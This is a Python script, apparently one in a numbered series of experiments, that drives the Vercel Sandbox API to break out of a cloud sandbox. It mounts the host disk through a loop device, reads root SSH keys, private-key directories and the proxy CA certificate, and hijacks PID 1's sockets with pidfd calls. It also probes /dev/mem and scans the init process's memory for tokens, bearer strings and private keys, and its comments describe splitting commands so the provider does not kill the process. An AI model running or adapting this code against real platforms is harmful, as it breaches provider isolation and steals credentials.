# 实验J144: 定向宿主侦察(短cmd防杀) — run/cell文件+opt/vercel配置+share目录+CA证书
# + process_vm_readv 内存读取(替代ptrace, 不暂停sandbox-init) + /dev/mem单独探测
# j143教训: 长grep杀进程, /dev/mem或ptrace导致沙箱停止(410) -> 全部拆小cmd
# 零破坏: 纯读
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=200):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=12000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)

NAME = "expj144"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

MOUNT_CODE = r'''
import os, ctypes, fcntl
libc = ctypes.CDLL(None, use_errno=True)
libc.mount.restype = ctypes.c_int
vda = os.open("/dev/vda", os.O_RDWR)
loop = os.open("/dev/loop0", os.O_RDWR)
fcntl.ioctl(loop, 0x4C00, vda)
os.makedirs("/tmp/host", exist_ok=True)
ctypes.set_errno(0)
r = libc.mount(b"/dev/loop0", b"/tmp/host", b"xfs", 1, b"nouuid,norecovery")
print("MOUNT_RC", r)
'''

# cmd1: 定向文件读取
FS1 = MOUNT_CODE + r'''
import subprocess
out = open("/tmp/d144a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
def sh(cmd, t=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, timeout=t)
        return (r.stdout or b"").decode("latin1", "replace") + (r.stderr or b"").decode("latin1", "replace")
    except Exception as e:
        return "EXC %r" % (e,)

p("=== RUN_CELL_FILE ===")
p(sh("cat /tmp/host/run/cell 2>&1; echo; ls -la /tmp/host/run/cell 2>&1"))
p("=== OPT_VERCEL ===")
p(sh("ls -laR /tmp/host/opt/vercel/ 2>&1 | head -60"))
p("=== SHARE_DIR ===")
p(sh("ls -la /tmp/host/volumes/run/vercel/share/ 2>&1"))
p("=== PKI_PRIVATE ===")
p(sh("ls -la /tmp/host/etc/pki/tls/private/ 2>&1"))
p("=== ROOT_SSH ===")
p(sh("ls -la /tmp/host/root/.ssh/ 2>&1; cat /tmp/host/root/.ssh/* 2>&1 | head -c 1000"))
p("=== ETC_HOSTS ===")
p(sh("cat /etc/hosts 2>&1 | head -20"))
p("=== CA_CERT_LIVE ===")
p(sh("cat /etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem 2>&1 | head -c 2500"))
p("=== OPT_VERCEL_FILES ===")
p(sh("find /tmp/host/opt/vercel -maxdepth 4 -type f 2>/dev/null | head -30"))
p("=== DONE")
out.close()
'''

# cmd2: agent socket 识别 (int fd 修复) + strings sandbox-init
FS2 = r'''
import os, subprocess, ctypes, struct, re
out = open("/tmp/d144b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.getsockname.restype = ctypes.c_int
libc.getpeername.restype = ctypes.c_int
libc.getsockopt.restype = ctypes.c_int
def sc(nr, *a):
    ctypes.set_errno(0)
    return libc.syscall(nr, *a)
pfd = sc(434, 1, 0)
p("PIDFD", pfd)
for fd in sorted(os.listdir("/proc/1/fd"), key=int):
    try:
        ln = os.readlink("/proc/1/fd/" + fd)
    except Exception:
        continue
    if "socket:" not in ln:
        continue
    nfd = sc(438, pfd, int(fd), 0)
    if nfd < 0:
        p("fd", fd, "dup_fail", ctypes.get_errno())
        continue
    for label, fn in (("L", libc.getsockname), ("P", libc.getpeername)):
        buf = ctypes.create_string_buffer(256)
        l = ctypes.c_int(256)
        r = fn(nfd, ctypes.cast(buf, ctypes.c_void_p), ctypes.byref(l))
        if r != 0:
            p("fd", fd, label, "err", ctypes.get_errno())
            continue
        fam = struct.unpack_from("H", buf.raw, 0)[0]
        if fam == 1:
            p("fd", fd, label, "UNIX", repr(buf.raw[2:l.value].rstrip(b"\x00")))
        elif fam == 2:
            port, ip = struct.unpack_from(">HI", buf.raw, 2)
            p("fd", fd, label, "INET", "%d.%d.%d.%d:%d" % (ip >> 24 & 255, ip >> 16 & 255, ip >> 8 & 255, ip & 255, port))
        elif fam == 40:
            cid, port = struct.unpack_from(">II", buf.raw, 2)
            p("fd", fd, label, "VSOCK", "cid=%d port=%d" % (cid, port))
        else:
            p("fd", fd, label, "fam", fam)
    cb = ctypes.create_string_buffer(12)
    cl = ctypes.c_int(12)
    r2 = libc.getsockopt(nfd, 1, 17, cb, ctypes.byref(cl))
    if r2 == 0:
        pid, uid, gid = struct.unpack("iii", cb.raw[:12])
        p("fd", fd, "peer(pid=%d uid=%d gid=%d)" % (pid, uid, gid))
    libc.close(nfd)
p("=== STRINGS_INIT ===")
try:
    data = open("/run/vercel/share/sandbox-init", "rb").read()
    strs = re.findall(rb"[\x20-\x7e]{6,}", data)
    kw = (b"vsock", b"cell", b"token", b"http", b"sign", b"proxy", b"cert", b"key", b"sock", b"host", b"port", b"secret", b"bearer", b"vcp_", b"agent", b"connect", b"spawn", b"unix")
    n = 0
    for s in strs:
        low = s.lower()
        if any(k in low for k in kw):
            p("S:", s[:200])
            n += 1
            if n > 150:
                break
except Exception as e:
    p("STRINGS_ERR", repr(e))
p("=== DONE")
out.close()
'''

# cmd3: /dev/mem 单独探测 (若沙箱停止只损失此步)
FS3 = r'''
import os
out = open("/tmp/d144c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("=== DEV_MEM ===")
try:
    f = open("/dev/mem", "rb")
    d = f.read(4096)
    f.close()
    p("mem read ok", len(d), d[:16].hex())
except Exception as e:
    p("mem err", repr(e))
p("=== KCORE ===")
try:
    st = os.stat("/proc/kcore")
    p("kcore size", st.st_size)
except Exception as e:
    p("kcore err", repr(e))
p("=== DONE")
out.close()
'''

# cmd4: process_vm_readv 读 sandbox-init 内存 (不暂停进程)
FS4 = r'''
import os, ctypes, struct, time
out = open("/tmp/d144d.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL(None, use_errno=True)
libc.syscall.restype = ctypes.c_long
class iovec(ctypes.Structure):
    _fields_ = [("base", ctypes.c_void_p), ("len", ctypes.c_size_t)]
def vmread(pid, start, size):
    lb = ctypes.create_string_buffer(size)
    local = iovec(ctypes.cast(lb, ctypes.c_void_p), size)
    remote = iovec(start, size)
    ctypes.set_errno(0)
    r = libc.syscall(310, pid, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
    if r < 0:
        return None, ctypes.get_errno()
    return lb.raw[:r], 0
pats = [b"BEGIN", b"ca-key", b"vcp_", b"token", b"cell", b"init.sock", b"https://", b"bearer", b"secret", b"PRIVATE KEY", b"X-Signature", b"pubkey", b"sign", b"agent"]
hits = []
segs = 0
try:
    maps = open("/proc/1/maps").read()
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) < 2:
            continue
        perms = parts[1]
        if perms[0] != "r":
            continue
        if "w" not in perms:
            continue
        a0, a1 = parts[0].split("-")
        start, end = int(a0, 16), int(a1, 16)
        if end - start > 32 * 1024 * 1024:
            continue
        data, err = vmread(1, start, end - start)
        if data is None:
            continue
        segs += 1
        for pat in pats:
            idx = 0
            while True:
                i = data.find(pat, idx)
                if i < 0:
                    break
                seg = data[max(0, i - 120):i + 200]
                hits.append((hex(start + i), pat, seg))
                idx = i + 1
    p("mem segs", segs, "hits", len(hits))
    seen = set()
    for off, pat, seg in hits[:80]:
        k = seg[:60]
        if k in seen:
            continue
        seen.add(k)
        p("OFF", off, pat, repr(seg[:320]))
except Exception as e:
    p("VMR_ERR", repr(e))
p("=== DONE")
out.close()
'''

run_cmd(sid, FS1, "fs-detail", timeout=200)
catfile(sid, "/tmp/d144a.txt", "d144a")

run_cmd(sid, FS2, "sock-strings", timeout=200)
catfile(sid, "/tmp/d144b.txt", "d144b")

run_cmd(sid, FS3, "devmem", timeout=100)
catfile(sid, "/tmp/d144c.txt", "d144c", 2000)

run_cmd(sid, FS4, "vmread", timeout=200)
catfile(sid, "/tmp/d144d.txt", "d144d")

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
